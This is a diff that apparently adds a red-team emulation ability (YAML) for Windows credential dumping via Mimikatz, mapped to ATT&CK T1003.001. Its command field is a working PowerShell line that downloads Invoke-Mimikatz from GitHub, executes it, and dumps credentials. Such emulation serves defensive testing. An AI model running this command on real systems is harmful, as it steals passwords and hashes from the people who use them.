@@ -1,0 +1,24 @@
+---
+- id: 82dcefb5c3512d73bf2248cb0127c4ae
+  name: Powershell Mimikatz
+  description: "Dumps credentials from memory via Powershell by invoking a remote\
+    \ mimikatz script.\nIf Mimikatz runs successfully you will see several usernames\
+    \ and hashes output to the screen.\nCommon failures include seeing an \\\"access\
+    \ denied\\\" error which results when Anti-Virus blocks execution. \nOr, if you\
+    \ try to run the test without the required administrative privileges you will\
+    \ see this error near the bottom of the output to the screen \"ERROR kuhl_m_sekurlsa_acquireLSA\"\
+    \n"
+  tactic: credential-access
+  technique:
+    attack_id: T1003.001
+    name: 'OS Credential Dumping: LSASS Memory'
+  platforms:
+    windows:
+      psh:
+        command: IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1');
+          Invoke-Mimikatz -DumpCreds
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
